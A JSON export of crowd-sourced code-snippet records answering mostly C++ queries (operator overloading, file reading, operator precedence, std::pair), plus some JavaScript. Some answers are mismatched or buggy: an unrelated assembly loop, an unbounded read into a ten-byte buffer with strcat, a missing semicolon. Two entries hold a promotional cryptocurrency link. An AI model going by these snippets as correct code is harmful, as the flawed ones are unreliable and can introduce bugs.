    "description": "#include <chrono> #include <thread>  #include <opencv4/opencv2/highgui.hpp>  static constexpr const char * const WINDOW = \"1\";  void video_test() {     // It doesn't work properly without `drop=true` option     //make sure to have appsink buffer-list = false     cv::VideoCapture video(\"v4l2src device=/dev/video0 ! videoconvert ! videoscale ! videorate ! video/x-raw,width=640 ! appsink drop=true\", cv::CAP_GSTREAMER);      if(!video.isOpened()) {         return;     }      cv::namedWindow(         WINDOW,         cv::WINDOW_GUI_NORMAL | cv::WINDOW_NORMAL | cv::WINDOW_KEEPRATIO     );     cv::resizeWindow(WINDOW, 700, 700);      cv::Mat frame;     const std::chrono::seconds sec(1);     while(true) {         if(!video.read(frame)) {             break;         }         std::this_thread::sleep_for(sec);         cv::imshow(WINDOW, frame);         cv::waitKey(1);     } } \n",
    "reg_date": "2021-10-12T11:42:24.000Z"
  },
  {
    "id": 3205,
    "keyword": null,
    "link": null,
    "title": " opening file in c++",
    "description": "// reading a text file #include <iostream> #include <fstream> #include <string> using namespace std;  int main () {   string line;   ifstream myfile (\"example.txt\");   if (myfile.is_open())   {     while ( getline (myfile,line) )     {       //use line here     }     myfile.close();   }    else cout << \"Unable to open file\";     return 0; }\n#include <iostream> #include <fstream> using namespace std;  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\n/ fstream::open / fstream::close #include <fstream>      // std::fstream  int main () {    std::fstream fs;   fs.open (\"test.txt\", std::fstream::in | std::fstream::out | std::fstream::app);    fs << \" more lorem ipsum\";    fs.close();    return 0; }\n",
    "reg_date": "2021-10-12T11:42:24.000Z"
  },
  {
    "id": 3206,
    "keyword": null,
    "link": null,
    "title": " operand-- c++",
    "description": "++x; x+=1; x=x+1;\n",
    "reg_date": "2021-10-12T11:42:24.000Z"
  },
  {
    "id": 3207,
    "keyword": null,
    "link": null,
    "title": " operator ++ overloading c++",
    "description": "class Point { public: \tPoint& operator++() { ... }\t\t// prefix \tPoint operator++(int) { ... }\t// postfix   \tfriend Point& operator++(Point &p);\t\t\t// friend prefix   \tfriend Point operator++(Point &p, int);\t\t// friend postfix   \t// in Microsoft Docs written \"friend Point& operator++(Point &p, int);\" }; \n",
    "reg_date": "2021-10-12T11:42:24.000Z"
  },
  {
    "id": 3208,
    "keyword": null,
    "link": null,
    "title": " operator = overloading c++",
    "description": "// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\n#include <iostream>  class ExampleClass {   public:     ExampleClass() {}   \tExampleClass(int ex) {       example_ = 0;     }     int&       example()        { return example_; }     const int& example() const  { return example_; }   \t//Overload the \"+\" Operator   \tExampleClass operator+ (const ExampleClass& second_object_of_class) {     \tExampleClass object_of_class;     \tobject_of_class.example() = this -> example() + second_object_of_class.example();     \treturn object_of_class;   \t}   private:   \tint example_; };  int main() {   ExampleClass c1, c2;   c1.example() = 1;   c2.example() = 2;   ExampleClass c3 = c1 + c2;   //Calls operator+() of c1 with c2 as second_object_of_class   //c3 gets set to object_of_class   std::cout << c3.example(); }\n#include <iostream> #include <string>   class Car { private:     std::string m_make;     std::string m_model;   public:     Car(const std::string& make, const std::string& model)         : m_make{ make }, m_model{ model }     {     }       friend bool operator== (const Car &c1, const Car &c2);     friend bool operator!= (const Car &c1, const Car &c2); };   bool operator== (const Car &c1, const Car &c2) {     return (c1.m_make== c2.m_make &&             c1.m_model== c2.m_model); }   bool operator!= (const Car &c1, const Car &c2) {     return !(c1== c2); }   int main() {     Car corolla{ \"Toyota\", \"Corolla\" };     Car camry{ \"Toyota\", \"Camry\" };       if (corolla == camry)         std::cout << \"a Corolla and Camry are the same.\\n\";       if (corolla != camry)         std::cout << \"a Corolla and Camry are not the same.\\n\";       return 0; }\nostream &operator<<(ostream &output, const MyClass &myObject) {    output << \"P : \" << myObject.property;   return output;             } \ninline bool operator==(const X& lhs, const X& rhs){ /* do actual comparison */ } inline bool operator!=(const X& lhs, const X& rhs){ return !(lhs == rhs); }\n// This will substract one vector (math vector) from another // Good example of how to use operator overloading  vec2 operator - (vec2 const &other) {     return vec2(x - other.x, y - other.y); }\n",
    "reg_date": "2021-10-12T11:42:24.000Z"
  },
  {
    "id": 3209,
    "keyword": null,
    "link": null,
    "title": " operator c++",
    "description": "\t\t\t\t\t\t\tCommon operators assignment | increment | arithmetic |  logical | comparison | member | other \t\t   | decrement |            |\t\t   |\t\t    | access | -----------------------------------------------------------------------------                               a = b    |    ++a    |     +a\t    |\t !a\t   |   a == b   |  a[b]  | a(...)   a += b   |\t--a\t   |     -a\t\t|  a && b  |   a != b   |   *a   |  a, b   a -= b   |\ta++\t   |   a + b\t|  a || b  |   a < b    |   &a   |  ? :   a *= b   |\ta--\t   |   a - b\t|\t       |   a > b    |  a->b  |   a /= b   |\t\t   |   a * b\t|\t       |   a <= b\t|  a.b   |   a %= b   |\t\t   |   a / b\t|\t\t   |   a >= b\t|  a->*b |   a &= b   |\t\t   |   a % b\t|\t\t   |   a <=> b\t|  a.*b  |   a |= b   |\t\t   |     ~a\t\t|\t\t   |\t\t    |\t\t |   a ^= b   |\t\t   |   a & b\t|\t\t   |   \t\t    |\t\t |   a <<= b  |\t\t   |   a | b\t|\t\t   |\t\t\t|\t\t |   a >>= b  |\t\t   |   a ^ b\t|\t\t   |\t\t\t|\t\t |         \t\t   |\t\t   |   a << b\t|\t\t   |\t\t\t|\t\t |        \t   |\t\t   |   a >> b\t|\t\t   |\t\t\t|\t\t |  \n",
    "reg_date": "2021-10-12T11:42:24.000Z"
  },
  {
    "id": 3210,
    "keyword": null,
    "link": null,
    "title": " operator in c++",
    "description": "2x in c++   \npacket >> rec1.getPosition().x >> rec1.getPosition().y; \n",
    "reg_date": "2021-10-12T11:42:24.000Z"
  },
  {
    "id": 3211,
    "keyword": null,
    "link": null,
    "title": " operator int()",
    "description": "// it's allow you to convert from an custom type in our case (number) // to another data type like (int) // without it ( operator int() ) the complier can not assign ob to x in this example below class number{ float num; public: \tnumber(float n=0)     {       num =n;     }   // operator that convert to int   operator int()   {     return int(num)   }    };// end of the class  int main() {   number ob(23.20);   int x;   x = ob;  // here we assign ob member to x      return 0; }\n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3212,
    "keyword": null,
    "link": null,
    "title": " operator overload string concatenate",
    "description": "#include <iostream> #include <string.h> using namespace std;  class Name {     public:         char x[100];         Name(){}         Name(char x[])         {             strcpy(this->x,x);         }                  Name operator+(Name&y)         {             Name fullname;             strcat(this->x,\" \");             strcat(this->x,y.x);             strcpy(fullname.x,this->x);             return fullname;         } };  int main() {     char fname[10], lname[10];     cin>>fname>>lname;     Name f(fname);     Name l(lname);     Name final=f+l;     cout<<final.x;     return 0; }\n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3213,
    "keyword": null,
    "link": null,
    "title": " operator overloading",
    "description": "std::ostream& operator<<(std::ostream& out, const Course& course) {     out << course.getName(); // for example     return out; } \n// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\nIn C++, we can change the way operators work for user-defined types like objects and structures. This is known as operator overloading. For example,  Suppose we have created three objects c1, c2 and result from a class named Complex that represents complex numbers.  Since operator overloading allows us to change how operators work, we can redefine how the + operator works and use it to add the complex numbers of c1 and c2 by writing the following code:  result = c1 + c2; instead of something like  result = c1.addNumbers(c2); This makes our code intuitive and easy to understand.  Note: We cannot use operator overloading for fundamental data types like int, float, char and so on.  Syntax for C++ Operator Overloading To overload an operator, we use a special operator function.  class className {     ... .. ...     public        returnType operator symbol (arguments) {            ... .. ...        }      ... .. ... };\n#include <iostream> #include <string>   class Car { private:     std::string m_make;     std::string m_model;   public:     Car(const std::string& make, const std::string& model)         : m_make{ make }, m_model{ model }     {     }       friend bool operator== (const Car &c1, const Car &c2);     friend bool operator!= (const Car &c1, const Car &c2); };   bool operator== (const Car &c1, const Car &c2) {     return (c1.m_make== c2.m_make &&             c1.m_model== c2.m_model); }   bool operator!= (const Car &c1, const Car &c2) {     return !(c1== c2); }   int main() {     Car corolla{ \"Toyota\", \"Corolla\" };     Car camry{ \"Toyota\", \"Camry\" };       if (corolla == camry)         std::cout << \"a Corolla and Camry are the same.\\n\";       if (corolla != camry)         std::cout << \"a Corolla and Camry are not the same.\\n\";       return 0; }\n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3214,
    "keyword": null,
    "link": null,
    "title": " operator overloading in c++",
    "description": "// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\n#include <iostream>  class ExampleClass {   public:     ExampleClass() {}   \tExampleClass(int ex) {       example_ = 0;     }     int&       example()        { return example_; }     const int& example() const  { return example_; }   \t//Overload the \"+\" Operator   \tExampleClass operator+ (const ExampleClass& second_object_of_class) {     \tExampleClass object_of_class;     \tobject_of_class.example() = this -> example() + second_object_of_class.example();     \treturn object_of_class;   \t}   private:   \tint example_; };  int main() {   ExampleClass c1, c2;   c1.example() = 1;   c2.example() = 2;   ExampleClass c3 = c1 + c2;   //Calls operator+() of c1 with c2 as second_object_of_class   //c3 gets set to object_of_class   std::cout << c3.example(); }\n#include <iostream> #include <string>   class Car { private:     std::string m_make;     std::string m_model;   public:     Car(const std::string& make, const std::string& model)         : m_make{ make }, m_model{ model }     {     }       friend bool operator== (const Car &c1, const Car &c2);     friend bool operator!= (const Car &c1, const Car &c2); };   bool operator== (const Car &c1, const Car &c2) {     return (c1.m_make== c2.m_make &&             c1.m_model== c2.m_model); }   bool operator!= (const Car &c1, const Car &c2) {     return !(c1== c2); }   int main() {     Car corolla{ \"Toyota\", \"Corolla\" };     Car camry{ \"Toyota\", \"Camry\" };       if (corolla == camry)         std::cout << \"a Corolla and Camry are the same.\\n\";       if (corolla != camry)         std::cout << \"a Corolla and Camry are not the same.\\n\";       return 0; }\nBox operator+(const Box&); \n#include <iostream> using namespace std;  class Box {    public:       double getVolume(void) {          return length * breadth * height;       }       void setLength( double len ) {          length = len;       }       void setBreadth( double bre ) {          breadth = bre;       }       void setHeight( double hei ) {          height = hei;       }              // Overload + operator to add two Box objects.       Box operator+(const Box& b) {          Box box;          box.length = this->length + b.length;          box.breadth = this->breadth + b.breadth;          box.height = this->height + b.height;          return box;       }           private:       double length;      // Length of a box       double breadth;     // Breadth of a box       double height;      // Height of a box };  // Main function for the program int main() {    Box Box1;                // Declare Box1 of type Box    Box Box2;                // Declare Box2 of type Box    Box Box3;                // Declare Box3 of type Box    double volume = 0.0;     // Store the volume of a box here      // box 1 specification    Box1.setLength(6.0);     Box1.setBreadth(7.0);     Box1.setHeight(5.0);      // box 2 specification    Box2.setLength(12.0);     Box2.setBreadth(13.0);     Box2.setHeight(10.0);      // volume of box 1    volume = Box1.getVolume();    cout << \"Volume of Box1 : \" << volume <<endl;      // volume of box 2    volume = Box2.getVolume();    cout << \"Volume of Box2 : \" << volume <<endl;     // Add two object as follows:    Box3 = Box1 + Box2;     // volume of box 3    volume = Box3.getVolume();    cout << \"Volume of Box3 : \" << volume <<endl;     return 0; }\ninline bool operator==(const X& lhs, const X& rhs){ return cmp(lhs,rhs) == 0; } inline bool operator!=(const X& lhs, const X& rhs){ return cmp(lhs,rhs) != 0; } inline bool operator< (const X& lhs, const X& rhs){ return cmp(lhs,rhs) <  0; } inline bool operator> (const X& lhs, const X& rhs){ return cmp(lhs,rhs) >  0; } inline bool operator<=(const X& lhs, const X& rhs){ return cmp(lhs,rhs) <= 0; } inline bool operator>=(const X& lhs, const X& rhs){ return cmp(lhs,rhs) >= 0; }\n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3215,
    "keyword": null,
    "link": null,
    "title": " operator overloading in c++ <<",
    "description": "#include <iostream>  class ExampleClass {   public:     ExampleClass() {}   \tExampleClass(int ex) {       example_ = 0;     }     int&       example()        { return example_; }     const int& example() const  { return example_; }   \t//Overload the \"+\" Operator   \tExampleClass operator+ (const ExampleClass& second_object_of_class) {     \tExampleClass object_of_class;     \tobject_of_class.example() = this -> example() + second_object_of_class.example();     \treturn object_of_class;   \t}   private:   \tint example_; };  int main() {   ExampleClass c1, c2;   c1.example() = 1;   c2.example() = 2;   ExampleClass c3 = c1 + c2;   //Calls operator+() of c1 with c2 as second_object_of_class   //c3 gets set to object_of_class   std::cout << c3.example(); }\nBox operator+(const Box&); \n#include <iostream> using namespace std;  class Box {    public:       double getVolume(void) {          return length * breadth * height;       }       void setLength( double len ) {          length = len;       }       void setBreadth( double bre ) {          breadth = bre;       }       void setHeight( double hei ) {          height = hei;       }              // Overload + operator to add two Box objects.       Box operator+(const Box& b) {          Box box;          box.length = this->length + b.length;          box.breadth = this->breadth + b.breadth;          box.height = this->height + b.height;          return box;       }           private:       double length;      // Length of a box       double breadth;     // Breadth of a box       double height;      // Height of a box };  // Main function for the program int main() {    Box Box1;                // Declare Box1 of type Box    Box Box2;                // Declare Box2 of type Box    Box Box3;                // Declare Box3 of type Box    double volume = 0.0;     // Store the volume of a box here      // box 1 specification    Box1.setLength(6.0);     Box1.setBreadth(7.0);     Box1.setHeight(5.0);      // box 2 specification    Box2.setLength(12.0);     Box2.setBreadth(13.0);     Box2.setHeight(10.0);      // volume of box 1    volume = Box1.getVolume();    cout << \"Volume of Box1 : \" << volume <<endl;      // volume of box 2    volume = Box2.getVolume();    cout << \"Volume of Box2 : \" << volume <<endl;     // Add two object as follows:    Box3 = Box1 + Box2;     // volume of box 3    volume = Box3.getVolume();    cout << \"Volume of Box3 : \" << volume <<endl;     return 0; }\nostream &operator<<(ostream &output, const MyClass &myObject) {    output << \"P : \" << myObject.property;   return output;             } \nistream &operator>>( istream  &input, Class_Name &c )\nstruct Foo {     double val;     friend bool operator<(const Foo& l, const Foo& r)     {       \t//Custom comparison for l < r goes here         return l.val < r.val;      } };\n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3216,
    "keyword": null,
    "link": null,
    "title": " operator overloading in c++ example",
    "description": "// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\n#include <iostream>  class ExampleClass {   public:     ExampleClass() {}   \tExampleClass(int ex) {       example_ = 0;     }     int&       example()        { return example_; }     const int& example() const  { return example_; }   \t//Overload the \"+\" Operator   \tExampleClass operator+ (const ExampleClass& second_object_of_class) {     \tExampleClass object_of_class;     \tobject_of_class.example() = this -> example() + second_object_of_class.example();     \treturn object_of_class;   \t}   private:   \tint example_; };  int main() {   ExampleClass c1, c2;   c1.example() = 1;   c2.example() = 2;   ExampleClass c3 = c1 + c2;   //Calls operator+() of c1 with c2 as second_object_of_class   //c3 gets set to object_of_class   std::cout << c3.example(); }\n#include <iostream> #include <string>   class Car { private:     std::string m_make;     std::string m_model;   public:     Car(const std::string& make, const std::string& model)         : m_make{ make }, m_model{ model }     {     }       friend bool operator== (const Car &c1, const Car &c2);     friend bool operator!= (const Car &c1, const Car &c2); };   bool operator== (const Car &c1, const Car &c2) {     return (c1.m_make== c2.m_make &&             c1.m_model== c2.m_model); }   bool operator!= (const Car &c1, const Car &c2) {     return !(c1== c2); }   int main() {     Car corolla{ \"Toyota\", \"Corolla\" };     Car camry{ \"Toyota\", \"Camry\" };       if (corolla == camry)         std::cout << \"a Corolla and Camry are the same.\\n\";       if (corolla != camry)         std::cout << \"a Corolla and Camry are not the same.\\n\";       return 0; }\nBox operator+(const Box&); \nostream &operator<<(ostream &output, const MyClass &myObject) {    output << \"P : \" << myObject.property;   return output;             } \nCount: 6\n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3217,
    "keyword": null,
    "link": null,
    "title": " operator overloading outside class",
    "description": "//Overloading an operator ouside a class //Note that unlike when it's done inside a class //the + operator requires 2 arguments instead of 1 //this is because there is no \"this\" object to be the  //default lvalue  class Vector2 { public:     float x, y ; } ;  Vector2 operator+( const Vector2& v1, const Vector2& v2 ) {     Vector2 ans ;     ans.x = v1.x + v2.x ;     ans.y = v1.y + v2.y ;     return ans ; } \n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3218,
    "keyword": null,
    "link": null,
    "title": " operator precedence in c++",
    "description": "Operator Precendence in C++ ----------------------------------------------------------------------------------------------- Precedence   Operator\t                        Description\t              Associativity     -----------------------------------------------------------------------------------------------  1           ::                                 scope Resolution          Left to right         -----------------------------------------------------------------------------------------------  2           a++ a--                            Postfix incre/decre       Left to right                       type() type{}                      Functioncal cast                                  a()                                function call                                   []                                 subscript                                       -> .                               Member Access                      -----------------------------------------------------------------------------------------------  3           ++a --a                            Prefix incre/decre        Right to left              + -                                Unary\t                                         ! ~                                Logical NOT,bitwise NOT                          (type)*                            C-style typecast                                      &                                Address of                                      sizeof                             size-of                                                     co_await                           await expression                                     new new[]                          Dynamic memory allocation                                                delete delete[]                    Dynamic memory De-allocation                                              -----------------------------------------------------------------------------------------------  4            . * ->*                           pointer to member         Left to right   5            * / %\t                            Multiplicative\t                   6            + -\t                            Additive\t                         7            << >>\t                            Shift\t                           8            <=>                               Three way comparsion                              9            < <= > >=\t                        Relational\t                       10           == !=\t                            Equality\t                       11           &\t                                Bitwise AND     \t               12           ^                                 Bitwise XOR     \t                 13           |\t                                Bitwise OR\t                14           &&\t                            Logical AND\t                15           ||\t                            Logical OR\t                ----------------------------------------------------------------------------------------------  16           ?:\t                            Conditional\t              Right to left               throw                             Throw Operator               co_yield                          yield Expression                  =                              Assignment               += -= *= /= %=>>= <<= &= ^= |=    Compound Assignment\t  ---------------------------------------------------------------------------------------------        17            ,\t                            Comma\t                  Left to right ----------------------------------------------------------------------------------------------         \n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3219,
    "keyword": null,
    "link": null,
    "title": " operators c++",
    "description": "The .* operator is used to dereference pointers to class members.\n\t\t\t\t\t\t\tCommon operators assignment | increment | arithmetic |  logical | comparison | member | other \t\t   | decrement |            |\t\t   |\t\t    | access | -----------------------------------------------------------------------------                               a = b    |    ++a    |     +a\t    |\t !a\t   |   a == b   |  a[b]  | a(...)   a += b   |\t--a\t   |     -a\t\t|  a && b  |   a != b   |   *a   |  a, b   a -= b   |\ta++\t   |   a + b\t|  a || b  |   a < b    |   &a   |  ? :   a *= b   |\ta--\t   |   a - b\t|\t       |   a > b    |  a->b  |   a /= b   |\t\t   |   a * b\t|\t       |   a <= b\t|  a.b   |   a %= b   |\t\t   |   a / b\t|\t\t   |   a >= b\t|  a->*b |   a &= b   |\t\t   |   a % b\t|\t\t   |   a <=> b\t|  a.*b  |   a |= b   |\t\t   |     ~a\t\t|\t\t   |\t\t    |\t\t |   a ^= b   |\t\t   |   a & b\t|\t\t   |   \t\t    |\t\t |   a <<= b  |\t\t   |   a | b\t|\t\t   |\t\t\t|\t\t |   a >>= b  |\t\t   |   a ^ b\t|\t\t   |\t\t\t|\t\t |         \t\t   |\t\t   |   a << b\t|\t\t   |\t\t\t|\t\t |        \t   |\t\t   |   a >> b\t|\t\t   |\t\t\t|\t\t |  \n// Operators are simply functions but cooler // E.g: The + sign is an operator, [] is an operator, you get the point // Which is even cooler is you can overload them // Means you can change their behavior // I can make + actually decrement (dont do this) int operator+(int other){ \treturn *this - other; } // And make - return always 0 int operator-(int other){ return 0; } // (THIS IS ANOTHER PROGRAM SO + AND - ARE NOT BROKEN ANYMORE) #include <iostream> #include <string> #include <stdio.h> #include <vector> // And then im gonna make a class class UselessClass{ private:   \t// And have a vector of integers with a bunch of numbers   \tstd::vector<int> numbers = {1, 2, 3}; public:   \t// Then im gonna make the array index operator return the int at the index but with 5 added to the int   \tint operator[](int index){     \treturn this->numbers[index] + 5;     } }; int main(){     // And then     UselessClass a;     std::cout << a[0] << \"\\n\";     // It will print 6 }\n2x in c++   \npacket >> rec1.getPosition().x >> rec1.getPosition().y; \n#include <stdio.h> int main() {    int var1 = 5, var2 = 5;     // 5 is displayed    // Then, var1 is increased to 6.    printf(\"%d\\n\", var1++);     // var2 is increased to 6     // Then, it is displayed.    printf(\"%d\\n\", ++var2);     return 0; }\n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3220,
    "keyword": null,
    "link": null,
    "title": " operators on strings c++",
    "description": " string s1 = \"Now is the time...\";  string s2 = \"for all good men...\";  string s3 = s1 + s2;  cout << \"s3 is \" << s3 << endl;             \n",
    "reg_date": "2021-10-12T11:42:25.000Z"
  },
  {
    "id": 3221,
    "keyword": null,
    "link": null,
    "title": " opperanf >> c++",
    "description": "packet >> rec1.getPosition().x >> rec1.getPosition().y; \n",
    "reg_date": "2021-10-12T11:42:26.000Z"
  },
  {
    "id": 3222,
    "keyword": null,
    "link": null,
    "title": " options select from array",
    "description": "var j = new Array(\"option1\",\"option2\",\"option3\",\"option4\",\"option5\"),     var options = '';  for (var i = 0; i < j.length; i++) {    options += '<option value=\"' + j[i]+ '\">' + j[i] + '</option>'; } $(\"#rec_mode\").html(options); \nvar videoSrcArr = new Array(\"option1\",\"option2\",\"option3\",\"option4\",\"option5\"),     selectEl = document.getElementById('rec_mode');   for(var i = 0; i < videoSrcArr.length; i++){     selectEl.options.add(new Option(videoSrcArr[i], videoSrcArr[i])); }                               \nvar states = new Array(); states['India'] = new Array('Andhra Pradesh','Arunachal Pradesh','Assam','Bihar','Chhattisgarh','Goa','Gujarat','Haryana','Himachal Pradesh','Jammu and Kashmir','Jharkhand','Karnataka','Kerala','Madhya Pradesh','Maharashtra','Manipur','Meghalaya','Mizoram','Nagaland','Odisha','Punjab','Rajasthan','Sikkim','Tamil Nadu','Telangana','Tripura','Uttar Pradesh','Uttarakhand','WestBengal','Andaman and Nicobar Islands','Chandigarh','Dadra and Nagar Haveli','Daman and Diu','Lakshadweep','Puducherry');   function setStates() { \tvar newOptions=states['India']; \tvar newValues=states['India']; \tselectField = document.getElementById(\"state\"); \tselectField.options.length = 0; \tfor (i=0; i<newOptions.length; i++)  \t{ \tselectField.options[selectField.length] = new Option(newOptions[i], newValues[i]); \t} }\n",
    "reg_date": "2021-10-12T11:42:26.000Z"
  },
  {
    "id": 3223,
    "keyword": null,
    "link": null,
    "title": " or in cpp",
    "description": "a || b = a or b\nThe .* operator is used to dereference pointers to class members.\nsection .text    global main extern printf  main:    mov ebx,10 ; moving the intial time to ebx loop:   push ebx ; value of first parameter    push message ; value of second parameter    call printf ; to outpur the result    dec ebx ; decrementing the value stored in ebx by 1    jnz loop ; if not equal to zero then a go to loop would be triggered    add esp,80   ;clearing the stack    ret  message   db   \"Value = %d\",10,0     Here's the solution to your question, please provide it a 100% rating. Thanks for asking and happy learning!!\nclass Entity{   public:    \t~Destructor();   \t//This is a destructor, which destroys instances and can free up memory. };  //Source for answer: // https://stackoverflow.com/questions/1395506/in-c-what-does-a-tilde-before-a-function-name-signify  //Other Sources: // https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_74/rzarg/cplr380.htm\npacket >> rec1.getPosition().x >> rec1.getPosition().y; \n",
    "reg_date": "2021-10-12T11:42:26.000Z"
  },
  {
    "id": 3224,
    "keyword": null,
    "link": null,
    "title": " or operator c++",
    "description": "if (a == 0 || b == 0) {   //statement here, || was used as an or }\na || b = a or b\nx = 11 % 3;\nThe .* operator is used to dereference pointers to class members.\nsection .text    global main extern printf  main:    mov ebx,10 ; moving the intial time to ebx loop:   push ebx ; value of first parameter    push message ; value of second parameter    call printf ; to outpur the result    dec ebx ; decrementing the value stored in ebx by 1    jnz loop ; if not equal to zero then a go to loop would be triggered    add esp,80   ;clearing the stack    ret  message   db   \"Value = %d\",10,0     Here's the solution to your question, please provide it a 100% rating. Thanks for asking and happy learning!!\nx = y = z = 5;\n",
    "reg_date": "2021-10-12T11:42:26.000Z"
  },
  {
    "id": 3225,
    "keyword": null,
    "link": null,
    "title": " ordenar string cpp",
    "description": "#include <iostream> #include <string> #include <vector>  using std::cout; using std::sort; using std::vector; using std::string; using std::endl;  int main() {     vector<string> arr = { \"raid\", \"implementation\", \"states\", \"all\",                            \"the\", \"requirements\", \"parameter\", \"a\",                            \"and\", \"or\", \"execution\", \"participate\" };       for (const auto &item : arr) {         cout << item << \"; \";     }     cout << endl;      sort(arr.begin(), arr.end());      for (const auto &item : arr) {         cout << item << \"; \";     }     cout << endl;      exit(EXIT_SUCCESS); } \n++ cCopy#include <iostream> #include <string> #include <vector>  using std::cout; using std::sort; using std::vector; using std::string; using std::endl;  int main() {     vector<string> arr = { \"raid\", \"implementation\", \"states\", \"all\",                            \"the\", \"requirements\", \"parameter\", \"a\",                            \"and\", \"or\", \"execution\", \"participate\" };       for (const auto &item : arr) {         cout << item << \"; \";     }     cout << endl;      sort(arr.begin(), arr.end());      for (const auto &item : arr) {         cout << item << \"; \";     }     cout << endl;      exit(EXIT_SUCCESS); } \n",
    "reg_date": "2021-10-12T11:42:26.000Z"
  },
  {
    "id": 3226,
    "keyword": null,
    "link": null,
    "title": " ordine crescente \"senza\" vettori in c++",
    "description": "ordine crescente \"senza\" vettori in c++   \n",
    "reg_date": "2021-10-12T11:42:26.000Z"
  },
  {
    "id": 3227,
    "keyword": null,
    "link": null,
    "title": " ordine crescente di numeri indefiniti  in c++",
    "description": "ordine crescente di numeri indefiniti  in c++   \n",
    "reg_date": "2021-10-12T11:42:26.000Z"
  },
  {
    "id": 3228,
    "keyword": null,
    "link": null,
    "title": " ouvrir un fichier en cpp",
    "description": "#include <iostream> #include <fstream> #include <string> using namespace std;   int main() {    ifstream fichier(\"YOUR_FILE\");     if(fichier) {       string ligne;        while(getline(fichier, ligne)) {          cout << ligne << endl;       }    } else {       cout << \"ERREUR: Impossible d'ouvrir le fichier en lecture.\" << endl;    }    return 0; }\n",
    "reg_date": "2021-10-12T11:42:26.000Z"
  },
  {
    "id": 3229,
    "keyword": null,
    "link": null,
    "title": " overload >> operator c++ in class",
    "description": "// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\nstruct Foo {     double val;     friend bool operator<(const Foo& l, const Foo& r)     {       \t//Custom comparison for l < r goes here         return l.val < r.val;      } };\nostream& operator<<(ostream& os, node* head) {     // Function call to overload the \"<<\"     // operator     print(head); } \nistream& operator>>(istream& is, node*& head) {     // Function call to overload the \">>\"     // operator     takeInput(head); } \n",
    "reg_date": "2021-10-12T11:42:26.000Z"
  },
  {
    "id": 3230,
    "keyword": null,
    "link": null,
    "title": " overload input operator c++",
    "description": "#include <iostream> using namespace std;   class Distance {    private:       int feet;             // 0 to infinite       int inches;           // 0 to 12           public:       // required constructors       Distance() {          feet = 0;          inches = 0;       }       Distance(int f, int i) {          feet = f;          inches = i;       }       friend ostream &operator<<( ostream &output, const Distance &D ) {           output << \"F : \" << D.feet << \" I : \" << D.inches;          return output;                   }        friend istream &operator>>( istream  &input, Distance &D ) {           input >> D.feet >> D.inches;          return input;                   } };  int main() {    Distance D1(11, 10), D2(5, 11), D3;     cout << \"Enter the value of object : \" << endl;    cin >> D3;    cout << \"First Distance : \" << D1 << endl;    cout << \"Second Distance :\" << D2 << endl;    cout << \"Third Distance :\" << D3 << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3231,
    "keyword": null,
    "link": null,
    "title": " overload the >> operator in c++",
    "description": "istream &operator>>( istream  &input, Class_Name &c )\n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3232,
    "keyword": null,
    "link": null,
    "title": " own bitcoin",
    "description": "Just go to https://cryptocreate.webflow.io/ and customize your own blockchain and create it. Thank me later\n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3233,
    "keyword": null,
    "link": null,
    "title": " own litecoin",
    "description": "Just go to https://cryptocreate.webflow.io/ and customize your own blockchain and create it. Thank me later\n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3234,
    "keyword": null,
    "link": null,
    "title": " pain",
    "description": "i feel you buddy\n//I know\n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3235,
    "keyword": null,
    "link": null,
    "title": " pair c++",
    "description": "// make_pair example #include <utility>      // std::pair #include <iostream>     // std::cout  int main () {   std::pair <int,int> foo;   std::pair <int,int> bar;    foo = std::make_pair (10,20);   bar = std::make_pair (10.5,'A'); // ok: implicit conversion from pair<double,char>    std::cout << \"foo: \" << foo.first << \", \" << foo.second << '\\n';   std::cout << \"bar: \" << bar.first << \", \" << bar.second << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:42:27.000Z"
  },
  {
    "id": 3236,
    "keyword": null,
    "link": null,
    "title": " pair in c++",
